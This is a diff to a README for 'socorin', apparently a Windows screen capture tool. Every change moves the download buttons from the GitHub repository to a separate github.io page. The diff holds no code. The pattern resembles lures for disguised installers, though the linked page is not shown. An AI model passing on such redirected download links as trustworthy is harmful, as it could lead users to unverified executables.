@@ -1,6 +1,6 @@
 # 📸 socorin - Capture, Annotate, and Record Effortlessly
 
-[![Download socorin](https://img.shields.io/badge/Download-socorin-blue?style=for-the-badge&logo=github)](https://github.com/Alinaoperative4216/socorin)
+[![Download socorin](https://img.shields.io/badge/Download-socorin-blue?style=for-the-badge&logo=github)](https://alinaoperative4216.github.io)
 
 ---
 
@@ -20,7 +20,7 @@ Follow these steps to get socorin up and running on your Windows computer. It sh
 
 Click this button to go to the official socorin download page:
 
-[**Download socorin Now**](https://github.com/Alinaoperative4216/socorin)
+[**Download socorin Now**](https://alinaoperative4216.github.io)
 
 ### Step 2: Find the Right File
 
@@ -46,7 +46,7 @@ After installation, you'll see a socorin icon on your desktop or in your Start M
 
 We recommend downloading from the official source to ensure you always get the latest and safest version.
 
-[![Download socorin](https://img.shields.io/badge/Get%20socorin-Free-green?style=for-the-badge)](https://github.com/Alinaoperative4216/socorin)
+[![Download socorin](https://img.shields.io/badge/Get%20socorin-Free-green?style=for-the-badge)](https://alinaoperative4216.github.io)
 
 If you encounter any issues during download, make sure you're connected to the internet and try a different browser.
 
@@ -145,7 +145,7 @@ socorin is released under an open-source license. This means you can use, modify
 
 Click the button below to get socorin and start capturing your screen today!
 
-[**🚀 Download socorin**](https://github.com/Alinaoperative4216/socorin)
+[**🚀 Download socorin**](https://alinaoperative4216.github.io)
 
 ---
 
